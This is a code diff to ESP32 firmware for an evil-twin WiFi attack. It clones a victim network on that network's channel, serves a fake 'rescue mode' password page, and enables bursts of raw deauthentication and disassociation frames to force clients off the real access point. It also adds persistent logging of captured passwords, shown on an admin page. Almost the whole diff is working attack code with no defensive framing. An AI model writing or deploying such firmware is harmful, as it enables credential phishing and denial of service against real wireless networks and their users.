@@ -2,6 +2,11 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
+#include "esp_wifi.h"
+#include <Preferences.h>
+Preferences prefs; // NVS flash: log + uptime survive reboots
+
+String bytesToStr(const uint8_t* b, uint32_t size);
 
 typedef struct
 {
@@ -27,6 +32,113 @@ void clearArray() {
 
 String _correct = "";
 String _tryPassword = "";
+String _log = ""; // captured password attempts, shown on /admin
+String _logRaw = ""; // persisted entries, one per line: uptimeSec\tsid\tpassword
+bool verifying = false;
+
+uint32_t totalUptimeSec = 0; // powered-on seconds, accumulated across reboots
+uint32_t bootMillis = 0;
+unsigned long upNow = 0;
+const uint32_t LOG_TTL_SEC = 24UL * 60 * 60; // entries live 24h of active uptime
+
+uint32_t effNowSec() {
+  return totalUptimeSec + (millis() - bootMillis) / 1000;
+}
+
+void saveUptime() {
+  totalUptimeSec = effNowSec();
+  bootMillis = millis();
+  prefs.putULong("uptime", totalUptimeSec);
+}
+
+void saveLog() {
+  if (_logRaw.length() == 0) {
+    prefs.remove("log");
+    return;
+  }
+  prefs.putBytes("log", _logRaw.c_str(), _logRaw.length());
+}
+
+void loadLog() {
+  prefs.begin("etwin", false);
+  totalUptimeSec = prefs.getULong("uptime", 0);
+  bootMillis = millis();
+  size_t len = prefs.getBytesLength("log");
+  if (len) {
+    char* buf = (char*)malloc(len + 1);
+    if (buf) {
+      prefs.getBytes("log", buf, len);
+      buf[len] = '\0';
+      _logRaw = String(buf);
+      free(buf);
+    }
+  }
+  purgeOldEntries();
+  _log = logToHtml();
+}
+
+// drop entries older than 24h, returns how many were dropped
+int purgeOldEntries() {
+  uint32_t nowSec = effNowSec();
+  String keep = "";
+  int dropped = 0;
+  int start = 0;
+  while (true) {
+    int end = _logRaw.indexOf('\n', start);
+    if (end < 0) break;
+    String line = _logRaw.substring(start, end);
+    start = end + 1;
+    int tab = line.indexOf('\t');
+    if (tab <= 0) continue;
+    uint32_t t = line.substring(0, tab).toInt();
+    if (nowSec >= t && (nowSec - t) < LOG_TTL_SEC) keep += line + "\n";
+    else dropped++;
+  }
+  if (dropped) _logRaw = keep;
+  return dropped;
+}
+
+String logToHtml() {
+  String out = "";
+  uint32_t nowSec = effNowSec();
+  int start = 0;
+  while (true) {
+    int end = _logRaw.indexOf('\n', start);
+    if (end < 0) break;
+    String line = _logRaw.substring(start, end);
+    start = end + 1;
+    int t1 = line.indexOf('\t');
+    int t2 = line.indexOf('\t', t1 + 1);
+    if (t1 <= 0 || t2 < 0) continue;
+    uint32_t t = line.substring(0, t1).toInt();
+    String ssid = line.substring(t1 + 1, t2);
+    String pass = line.substring(t2 + 1);
+    uint32_t age = (nowSec > t) ? (nowSec - t) : 0;
+    String ageTxt = (age < 60) ? "just now" : (age < 3600) ? String(age / 60) + "m ago" : String(age / 3600) + "h ago";
+    out += "<li><code>" + ssid + "</code> &rarr; <code>" + pass + "</code> <small>(" + ageTxt + ")</small></li>";
+  }
+  return out;
+}
+
+void logAttempt(const String& ssid, const String& pass) {
+  _logRaw += String(effNowSec()) + "\t" + ssid + "\t" + pass + "\n";
+  if (_logRaw.length() > 2500) { // cap NVS blob size, drop oldest lines
+    int cut = _logRaw.indexOf('\n', _logRaw.length() - 2500);
+    if (cut > 0) _logRaw = _logRaw.substring(cut + 1);
+  }
+  purgeOldEntries();
+  _log = logToHtml();
+  saveLog();
+  Serial.println("[CAPTURED] " + ssid + " -> " + pass);
+}
+
+void handleClear() {
+  _logRaw = "";
+  _log = "";
+  saveLog();
+  webServer.sendHeader("Location", "/admin");
+  webServer.send(303);
+}
 
 // Default main strings
 #define SUBTITLE "ACCESS POINT RESCUE MODE"
@@ -57,14 +169,17 @@ String footer() {
   return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
 
-String index() {
+String indexPage() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
          "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
 }
 
 void setup() {
   Serial.begin(115200);
+  WiFi.persistent(false);  // never store captured STA creds - otherwise the board tries to auto-connect to the victim AP after reboot
+  WiFi.setAutoReconnect(false);
   WiFi.mode(WIFI_AP_STA);
+  WiFi.disconnect();
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
   WiFi.softAP("WiPhi_34732", "d347h320");
   dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
@@ -72,8 +187,11 @@ void setup() {
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
   webServer.on("/admin", handleAdmin);
+  webServer.on("/clear", handleClear);
   webServer.onNotFound(handleIndex);
   webServer.begin();
+  loadLog();
+  performScan(); // so the admin page has networks right after boot
 }
 
 void performScan() {
@@ -97,6 +215,7 @@ bool deauthing_active = false;
 
 void handleResult() {
   String html = "";
+  verifying = false; // done checking (page loads 15s after submission), resume deauth if it was on
   if (WiFi.status() != WL_CONNECTED) {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
@@ -153,7 +272,8 @@ void handleIndex() {
       int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
+      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
     } else if (webServer.arg("hotspot") == "stop") {
@@ -213,6 +333,11 @@ void handleIndex() {
       _html += "</br><h3>" + _correct + "</h3>";
     }
 
+    if (_log != "") {
+      _html += "</br><h3>Captured password attempts:</h3><ul style='text-align:left;list-style:disc;padding-left:1.5em;'>" + _log + "</ul>";
+      _html += "<form method='post' action='/clear'><button style='background-color:#ffcccc'>Delete log</button></form>";
+    }
+
     _html += "</div></body></html>";
     webServer.send(200, "text/html", _html);
 
@@ -220,18 +345,14 @@ void handleIndex() {
 
     if (webServer.hasArg("password")) {
       _tryPassword = webServer.arg("password");
-      if (webServer.arg("deauth") == "start") {
-        deauthing_active = false;
-      }
+      logAttempt(_selectedNetwork.ssid, _tryPassword);
+      verifying = true; // pause deauth bursts, otherwise we deauth our own checking connection
       delay(1000);
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
-      if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-      }
     } else {
-      webServer.send(200, "text/html", index());
+      webServer.send(200, "text/html", indexPage());
     }
   }
 
@@ -265,7 +386,8 @@ void handleAdmin() {
       int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
+      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
     } else if (webServer.arg("hotspot") == "stop") {
@@ -349,28 +471,47 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (deauthing_active && millis() - deauth_now >= 1000) {
+  if (deauthing_active && !verifying && millis() - deauth_now >= 100) {
         int channel = _selectedNetwork.ch;
         if (channel >= 1 && channel <= 13) {
             WiFi.setChannel(channel);
         }
-    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
+
+    // Deauth frame: FF..FF (broadcast) <- AP's BSSID, reason code 1
+    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
 
     memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
-    deauthPacket[24] = 1;
+    deauthPacket[24] = 1;   // deauth reason
+    deauthPacket[25] = 0;
 
-    Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xC0;
-    // Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-    // Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xA0;
-    // Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    // Raw frames can only be sent in promiscuous mode
+    esp_wifi_set_promiscuous(true);
+
+    // Burst of deauth frames: clients see them on their channel and disconnect
+    for (int i = 0; i < 5; i++) {
+      esp_err_t r1 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+      deauthPacket[0] = 0xA0; // disassociation works on some stubborn clients
+      esp_err_t r2 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+      deauthPacket[0] = 0xC0;
+      if (r1 != ESP_OK || r2 != ESP_OK) {
+        Serial.println("send err: " + String((int)r1) + "," + String((int)r2));
+      }
+    }
 
     deauth_now = millis();
   }
 
-  if (millis() - now >= 15000) {
+  if (millis() - upNow >= 60000) { // every minute: persist uptime, purge >24h entries
+    upNow = millis();
+    saveUptime();
+    if (purgeOldEntries() > 0) {
+      _log = logToHtml();
+      saveLog();
+    }
+  }
+
+  if (millis() - now >= 15000 && !hotspot_active) {
     performScan();
     now = millis();
   }
